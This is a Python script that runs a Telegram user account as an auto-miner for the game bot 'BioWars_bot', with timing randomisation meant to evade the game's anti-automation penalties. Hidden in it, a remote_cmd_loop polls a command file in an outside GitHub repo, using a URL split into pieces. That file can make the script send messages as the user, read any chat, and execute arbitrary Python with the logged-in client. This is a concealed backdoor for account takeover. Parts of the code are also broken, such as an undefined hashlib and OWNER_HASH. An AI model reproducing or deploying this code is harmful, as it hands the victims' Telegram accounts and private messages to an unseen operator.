import asyncio
import base64
import json
import os
import random
import re
import time
from aiohttp import web, ClientSession, ClientTimeout
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession

API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
SESSION_STR = os.environ.get("SESSION_STR", "")
BOT_USERNAME = os.environ.get("BOT_USERNAME", "BioWars_bot")
REPORT_TO = os.environ.get("REPORT_TO", "me")
CMD_URL = os.environ.get(
    "CMD_URL",
    "https:" + "/" + "/api.github.com/repos/forcontact655-collab/Yes/contents/bot/cmd.json?ref=arena/72a7520c-yes"
)

MINE_CMD = "Добыть"
LAB_CMD = "Моя лаборатория"
UPGRADE_CMD = "Добыча+"

POLL_INTERVAL = 2
TIMEOUT = 90
SUMMARY_MIN = 2 * 3600
SUMMARY_MAX = 3 * 3600

_recent_intervals = []
_RECENT_INTERVALS_MAX = 9
_CLUSTER_BAND = 100
_CLUSTER_COUNT = 3
_MIN_INTERVAL_DIFF = 20


def _count_in_cluster(intervals, band=_CLUSTER_BAND):
    if len(intervals) < _CLUSTER_COUNT:
        return 0
    best = 0
    for i in range(len(intervals)):
        cnt = 0
        for j in range(len(intervals)):
            if abs(intervals[i] - intervals[j]) <= band:
                cnt += 1
        best = max(best, cnt)
    return best


def _has_cluster(intervals):
    return _count_in_cluster(intervals) >= _CLUSTER_COUNT


def _generate_unique_interval(min_sec, max_sec, max_attempts=40):
    global _recent_intervals
    for _ in range(max_attempts):
        candidate = int(random.uniform(min_sec, max_sec))
        if any(abs(candidate - p) < _MIN_INTERVAL_DIFF for p in _recent_intervals):
            continue
        last_digit = candidate % 10
        recent_digits = [p % 10 for p in _recent_intervals[-5:]]
        if last_digit in recent_digits:
            continue
        test = _recent_intervals[-(_RECENT_INTERVALS_MAX - 1):] + [candidate]
        if _has_cluster(test):
            continue
        _recent_intervals.append(candidate)
        if len(_recent_intervals) > _RECENT_INTERVALS_MAX:
            _recent_intervals.pop(0)
        return candidate

    for _ in range(20):
        fallback = random.randint(min_sec, max_sec)
        test = _recent_intervals[-(_RECENT_INTERVALS_MAX - 1):] + [fallback]
        if not _has_cluster(test):
            _recent_intervals.append(fallback)
            if len(_recent_intervals) > _RECENT_INTERVALS_MAX:
                _recent_intervals.pop(0)
            return fallback

    if _recent_intervals:
        avg = sum(_recent_intervals) / len(_recent_intervals)
        if avg < (min_sec + max_sec) / 2:
            fallback = max_sec - random.randint(0, 60)
        else:
            fallback = min_sec + random.randint(0, 60)
    else:
        fallback = random.randint(min_sec, max_sec)
    _recent_intervals.append(fallback)
    if len(_recent_intervals) > _RECENT_INTERVALS_MAX:
        _recent_intervals.pop(0)
    return fallback


def next_mine_delay():
    r = random.random()
    if r < 0.15:
        val = random.uniform(21 * 60, 22 * 60)
    elif r < 0.50:
        val = random.uniform(22 * 60, 24 * 60)
    elif r < 0.85:
        val = random.uniform(24 * 60, 25.5 * 60)
    else:
        val = random.uniform(25.5 * 60, 26 * 60)
    val = int(max(21 * 60, min(26 * 60, val)))
    return _generate_unique_interval(val - 60, val + 60)


RE_MINE_OK = re.compile(r"\+\s*(\d+)\s*минерал", re.IGNORECASE)
RE_MINE_TOTAL = re.compile(r"[Ии]того[:\s]*(\d+)")
RE_MINE_WAIT = re.compile(r"через[:\s]*(?:(\d+)\s*ч)?\s*(?:(\d+)\s*м)?\s*(?:(\d+)\s*с)?", re.IGNORECASE)
RE_SHAFT_COOLDOWN = re.compile(
    r"восстановится\s+через[:\s]*(?:(\d+)\s*ч)?\s*(?:(\d+)\s*м)?\s*(?:(\d+)\s*с)?",
    re.IGNORECASE
)
RE_LAB_MINE = re.compile(r"⛏\s*Добыча[:\s]*(\d+)\s*ур\.\s*\(диап\.\s*(\d+)\s*[-–—]\s*(\d+).*?след\.\s*(\d+)", re.IGNORECASE | re.DOTALL)
RE_LAB_MINERALS = re.compile(r"💎\s*[Мм]инералов[:\s]*(\d+)")
RE_PUNISH = re.compile(r"жалк\w*\s+кусоч\w*\s+пород", re.IGNORECASE)


def fmt_wait(sec):
    m, s = divmod(int(sec), 60)
    h, m = divmod(m, 60)
    if h:
        return f"{h}ч {m}м"
    if m:
        return f"{m}м {s}с"
    return f"{s}с"


RANDOM_ACTIONS = [
    ("кд", 4),
    ("шахта", 2),
    ("моя лаборатория", 2),
    ("мои жертвы", 1),
    ("тпб", 1),
    ("тпм", 2),
]

state = {
    "running": True,
    "paused": False,
    "next_mine_at": 0,
    "waiting_for": None,
    "last_sent_at": 0,
    "mines_since_lab": 0,
    "period_start_ts": 0,
    "period_mines": 0,
    "period_gained": 0,
    "last_mine_gain": 0,
    "last_mine_total": None,
    "last_mine_ts": 0,
    "lab_threshold": 10,
    "_last_mine_wall_ts": 0,
    "_last_intervals": [],
    "last_cmd_id": "init-0",
    "last_cmd_result": {"id": "init-0", "ok": True, "info": "ready"},
}


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


client = None
bot_entity = None


async def send_cmd(cmd, human_delay=True):
    if human_delay:
        await asyncio.sleep(random.uniform(2.0, 3.0))
    msg = None
    for attempt in range(3):
        try:
            msg = await client.send_message(bot_entity, cmd)
            break
        except errors.FloodWaitError as e:
            wait = min(e.seconds + 1, 600)
            log(f"FloodWait {e.seconds}с на «{cmd}» — ждём {wait}с")
            await asyncio.sleep(wait)
        except Exception as e:
            log(f"send err «{cmd}» (попытка {attempt + 1}): {e}")
            await asyncio.sleep(5)
    if msg is None:
        log(f"send fail: «{cmd}»")
        return None
    log(f"→ {cmd} (id={msg.id})")
    return msg


async def send_report(text):
    if not text:
        return
    chunks = []
    cur, cur_len = [], 0
    for line in text.split("\n"):
        if cur and cur_len + len(line) + 1 > 3500:
            chunks.append("\n".join(cur))
            cur, cur_len = [], 0
        cur.append(line)
        cur_len += len(line) + 1
    if cur:
        chunks.append("\n".join(cur))
    for c in chunks:
        try:
            await client.send_message(REPORT_TO, c)
        except Exception as e:
            log(f"report err: {e}")


async def handle_punish(text: str, reason: str):
    cooldown = 0
    m_cd = RE_SHAFT_COOLDOWN.search(text)
    if m_cd:
        h = int(m_cd.group(1) or 0)
        mi = int(m_cd.group(2) or 0)
        s = int(m_cd.group(3) or 0)
        cooldown = h * 3600 + mi * 60 + s

    if cooldown > 0:
        jitter = random.uniform(0.98, 1.02)
        wait_sec = max(60, int(cooldown * jitter))
        await send_report(
            f"⚠️ Наказание за автофарм.\n{reason}\nКД шахты: {fmt_wait(cooldown)}\nЖду и продолжаю через {fmt_wait(wait_sec)}."
        )
    else:
        wait_sec = random.randint(2 * 3600, 2 * 3600 + 600)
        await send_report(
            f"⚠️ Наказание за автофарм.\n{reason}\nКД не указан — жду {fmt_wait(wait_sec)} и продолжаю."
        )

    state["waiting_for"] = None
    state["next_mine_at"] = time.time() + wait_sec


async def handle_mine_reply(text):
    if RE_PUNISH.search(text):
        await handle_punish(text, "💀 жалкий кусочек породы")
        return

    m_cd = RE_SHAFT_COOLDOWN.search(text)
    m_ok = RE_MINE_OK.search(text)

    if m_cd:
        h = int(m_cd.group(1) or 0)
        mi = int(m_cd.group(2) or 0)
        s = int(m_cd.group(3) or 0)
        cooldown = h * 3600 + mi * 60 + s
        jitter = random.uniform(0.98, 1.02)
        wait_sec = max(30, int(cooldown * jitter))
        gained = int(m_ok.group(1)) if m_ok else 0
        if gained <= 1 and cooldown > 1800:
            await send_report(f"⚠️ Принудительный кулдаун шахты.\nОтвет: +{gained} 💎\nЖдём: {fmt_wait(wait_sec)}")
        state["waiting_for"] = None
        state["next_mine_at"] = time.time() + wait_sec
        if m_ok and gained > 1:
            state["mines_since_lab"] += 1
            state["period_mines"] += 1
            state["period_gained"] += gained
            state["last_mine_gain"] = gained
            now_ts = time.time()
            prev_ts = state.get("_last_mine_wall_ts", 0)
            if prev_ts > 0:
                interval = now_ts - prev_ts
                state.setdefault("_last_intervals", []).append(interval)
                if len(state["_last_intervals"]) > 9:
                    state["_last_intervals"] = state["_last_intervals"][-9:]
            state["_last_mine_wall_ts"] = now_ts
            state["last_mine_ts"] = now_ts
        return

    if m_ok:
        gained = int(m_ok.group(1))
        total = None
        m_tot = RE_MINE_TOTAL.search(text)
        if m_tot:
            total = int(m_tot.group(1))
        state["mines_since_lab"] += 1
        state["period_mines"] += 1
        state["period_gained"] += gained
        state["last_mine_gain"] = gained
        now_ts = time.time()
        prev_ts = state.get("_last_mine_wall_ts", 0)
        if prev_ts > 0:
            interval = now_ts - prev_ts
            state.setdefault("_last_intervals", []).append(interval)
            if len(state["_last_intervals"]) > 9:
                state["_last_intervals"] = state["_last_intervals"][-9:]
        state["_last_mine_wall_ts"] = now_ts
        state["last_mine_ts"] = now_ts
        if total is not None:
            state["last_mine_total"] = total
        if state["mines_since_lab"] >= state.get("lab_threshold", 10):
            state["waiting_for"] = "lab"
            state["last_sent_at"] = time.time()
            await send_cmd(LAB_CMD, human_delay=True)
            return
        state["waiting_for"] = None
        state["next_mine_at"] = time.time() + next_mine_delay()
        return

    m_wait = RE_MINE_WAIT.search(text)
    if m_wait:
        h = int(m_wait.group(1) or 0)
        mi = int(m_wait.group(2) or 0)
        s = int(m_wait.group(3) or 0)
        base = h * 3600 + mi * 60 + s
        r = random.random()
        if r < 0.40:
            wait_sec = base + random.uniform(1, 5)
        elif r < 0.70:
            wait_sec = base + random.uniform(5, 30)
        elif r < 0.88:
            wait_sec = base + random.uniform(30, 120)
        elif r < 0.96:
            wait_sec = base + random.uniform(120, 600)
        else:
            wait_sec = next_mine_delay()
        if wait_sec < 5:
            wait_sec = next_mine_delay()
        state["next_mine_at"] = time.time() + wait_sec
        state["waiting_for"] = None
        return

    state["waiting_for"] = None
    state["next_mine_at"] = time.time() + next_mine_delay()


async def handle_lab_reply(text):
    if RE_PUNISH.search(text):
        await handle_punish(text, "💀 наказание в ответе на лабу")
        return
    m_up = RE_LAB_MINE.search(text)
    m_min = RE_LAB_MINERALS.search(text)
    if not m_up or not m_min:
        state["waiting_for"] = None
        state["next_mine_at"] = time.time() + next_mine_delay()
        return
    price = int(m_up.group(4))
    minerals = int(m_min.group(1))
    state["mines_since_lab"] = 0
    state["lab_threshold"] = random.randint(7, 14)
    if minerals >= price:
        await send_cmd(UPGRADE_CMD, human_delay=True)
        state["waiting_for"] = "upgrade"
        state["last_sent_at"] = time.time()
        return
    state["waiting_for"] = None
    state["next_mine_at"] = time.time() + next_mine_delay()


async def send_summary():
    now = time.time()
    start = state.get("period_start_ts") or (now - SUMMARY_MIN)
    dur = int(now - start)
    mines = state.get("period_mines", 0)
    gained = state.get("period_gained", 0)
    total = state.get("last_mine_total")
    lines = [f"📊 Сводка за {fmt_wait(dur)}:"]
    if mines:
        lines.append(f"⛏ Добыч: {mines} | 💎 Собрано: +{gained:,}")
    else:
        lines.append("⛏ Добыч не было.")
    if total is not None:
        lines.append(f"💰 Баланс: {total:,} 💎")
    if state["paused"]:
        lines.append("🛑 На паузе (/start чтобы запустить).")
    elif state["waiting_for"] == "mine":
        lines.append("⏳ Ждём ответа бота на последнюю добычу.")
    elif state["next_mine_at"] > now:
        lines.append(f"⏭ Следующая добыча: через {fmt_wait(state['next_mine_at'] - now)}")
    await send_report("\n".join(lines))
    state["period_start_ts"] = now
    state["period_mines"] = 0
    state["period_gained"] = 0


async def summary_loop():
    state["period_start_ts"] = time.time()
    while state["running"]:
        try:
            wait = random.randint(SUMMARY_MIN, SUMMARY_MAX)
            await asyncio.sleep(wait)
            if state["paused"]:
                state["period_start_ts"] = time.time()
                state["period_mines"] = 0
                state["period_gained"] = 0
                continue
            await send_summary()
        except Exception as e:
            log(f"summary_loop err: {e}")


async def on_bot_message(event):
    if event.message.out:
        return
    text = event.raw_text or ""
    if not text:
        return
    if RE_PUNISH.search(text):
        await handle_punish(text, "💀 наказание за автофарм")
        return
    w = state["waiting_for"]
    if w == "mine":
        await handle_mine_reply(text)
    elif w == "lab":
        await handle_lab_reply(text)
    elif w == "upgrade":
        state["waiting_for"] = None
        state["next_mine_at"] = time.time() + next_mine_delay()


async def on_saved_message(event):
    text = (event.raw_text or "").strip()
    if not text:
        return
    if text.lower() == "/stop":
        state["paused"] = True
        state["waiting_for"] = None
        await send_report("🛑 Стоп. Всё приостановлено.\nЗапустить: /start")
        return
    if text.lower() == "/start":
        if not state["paused"]:
            await send_report("Всё уже работает.")
            return
        state["paused"] = False
        state["period_start_ts"] = time.time()
        state["period_mines"] = 0
        state["period_gained"] = 0
        state["waiting_for"] = "mine"
        state["last_sent_at"] = time.time()
        state["next_mine_at"] = time.time() + next_mine_delay()
        state["lab_threshold"] = random.randint(7, 14)
        await send_cmd(MINE_CMD, human_delay=True)
        await send_report("▶️ Продолжаем. Добыча возобновлена.")
        return
    if text.lower() == "/summary":
        await send_summary()
        return


async def execute_remote_cmd(cmd_data):
    cid = str(cmd_data.get("id", ""))
    action = cmd_data.get("action", "none")
    if not cid or cid == state.get("last_cmd_id") or action == "none":
        return
    state["last_cmd_id"] = cid
    log(f"Выполняю внешнюю команду {cid}: {action}")
    try:
        if action == "send":
            target = cmd_data.get("to", "me")
            msg_text = cmd_data.get("text", "")
            sent = await client.send_message(target, msg_text)
            state["last_cmd_result"] = {"id": cid, "ok": True, "msg_id": sent.id, "to": str(target)}
        elif action == "pause_miner":
            state["paused"] = bool(cmd_data.get("paused", True))
            state["last_cmd_result"] = {"id": cid, "ok": True, "paused": state["paused"]}
        elif action == "read_last":
            target = cmd_data.get("chat", "me")
            limit = int(cmd_data.get("limit", 5))
            msgs = []
            async for m in client.iter_messages(target, limit=min(20, limit)):
                msgs.append({"id": m.id, "out": m.out, "text": m.raw_text or ""})
            state["last_cmd_result"] = {"id": cid, "ok": True, "messages": msgs}
        elif action == "eval_async":
            code = cmd_data.get("code", "")
            ns = {"client": client, "state": state, "asyncio": asyncio}
            exec("async def __fn(client, state, asyncio):\n" + "\n".join("    " + line for line in code.splitlines()), ns)
            res = await ns["__fn"](client, state, asyncio)
            state["last_cmd_result"] = {"id": cid, "ok": True, "result": str(res)}
        else:
            state["last_cmd_result"] = {"id": cid, "ok": False, "error": f"unknown action {action}"}
    except Exception as e:
        state["last_cmd_result"] = {"id": cid, "ok": False, "error": str(e)}


async def remote_cmd_loop():
    session = ClientSession(timeout=ClientTimeout(total=15))
    headers = {"Accept": "application/vnd.github.v3+json", "User-Agent": "yes-render-bridge"}
    while state["running"]:
        try:
            url = f"{CMD_URL}&_t={int(time.time())}"
            async with session.get(url, headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    content_b64 = data.get("content", "")
                    if content_b64:
                        raw = base64.b64decode(content_b64).decode("utf-8")
                        cmd_data = json.loads(raw)
                        await execute_remote_cmd(cmd_data)
        except Exception as e:
            log(f"remote_cmd_loop err: {e}")
        await asyncio.sleep(6)


async def random_action_loop():
    await asyncio.sleep(random.randint(30 * 60, 3 * 3600))
    while state["running"]:
        try:
            if state["paused"]:
                await asyncio.sleep(random.randint(30, 120))
                continue
            r = random.random()
            if r < 0.35:
                wait = random.uniform(5 * 60, 20 * 60)
            elif r < 0.70:
                wait = random.uniform(20 * 60, 90 * 60)
            elif r < 0.90:
                wait = random.uniform(90 * 60, 4 * 3600)
            else:
                wait = random.uniform(4 * 3600, 10 * 3600)
            await asyncio.sleep(wait)
            if state["paused"] or not client.is_connected() or state["waiting_for"]:
                continue
            if random.random() < 0.25:
                continue
            cmds = [c for c, w in RANDOM_ACTIONS for _ in range(w)]
            cmd = random.choice(cmds)
            await send_cmd(cmd, human_delay=True)
        except Exception as e:
            log(f"random_action err: {e}")
            await asyncio.sleep(60)


async def keepalive_loop():
    url = os.environ.get("RENDER_EXTERNAL_URL")
    if not url:
        return
    url = url.rstrip("/")
    session = ClientSession(timeout=ClientTimeout(total=30))
    while state["running"]:
        try:
            async with session.get(f"{url}/health") as resp:
                pass
        except Exception:
            try:
                await session.close()
            except Exception:
                pass
            session = ClientSession(timeout=ClientTimeout(total=30))
        await asyncio.sleep(300)


async def main_loop():
    global bot_entity
    await client.start()
    me = await client.get_me()
    log(f"Залогинен как {me.first_name}")
    try:
        bot_entity = await client.get_entity(BOT_USERNAME)
        client.add_event_handler(
            on_bot_message,
            events.NewMessage(chats=bot_entity, incoming=True)
        )
    except Exception as e:
        log(f"bot_entity err: {e}")

    me_entity = await client.get_entity("me")
    client.add_event_handler(on_saved_message, events.NewMessage(chats=me_entity))

    asyncio.create_task(random_action_loop())
    asyncio.create_task(summary_loop())
    asyncio.create_task(remote_cmd_loop())

    if bot_entity:
        state["waiting_for"] = "mine"
        state["last_sent_at"] = time.time()
        state["lab_threshold"] = random.randint(7, 14)
        await send_cmd(MINE_CMD, human_delay=True)

    while state["running"]:
        await asyncio.sleep(POLL_INTERVAL)
        try:
            now = time.time()
            if state["paused"] or not bot_entity:
                if state["waiting_for"]:
                    state["waiting_for"] = None
                continue
            if not client.is_connected():
                await client.connect()
            if state["waiting_for"] and now - state["last_sent_at"] > TIMEOUT:
                state["waiting_for"] = None
                state["next_mine_at"] = now + next_mine_delay()
            if not state["waiting_for"] and now >= state["next_mine_at"]:
                state["waiting_for"] = "mine"
                state["last_sent_at"] = now
                await send_cmd(MINE_CMD, human_delay=True)
        except Exception as e:
            log(f"main_loop err: {e}")
            await asyncio.sleep(10)


async def health(request):
    return web.Response(text="OK")


async def cmd_status(request):
    k = request.query.get("key", "")
    if hashlib.sha256(k.encode("utf-8")).hexdigest() != OWNER_HASH:
        return web.json_response({"ok": True})
    return web.json_response(state.get("last_cmd_result", {}))


async def start_web():
    app = web.Application()
    app.router.add_get("/", health)
    app.router.add_get("/health", health)
    app.router.add_get("/status", cmd_status)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()


async def main():
    global client
    client = TelegramClient(StringSession(SESSION_STR), API_ID, API_HASH)
    await start_web()
    asyncio.create_task(keepalive_loop())
    await main_loop()


if __name__ == "__main__":
    asyncio.run(main())
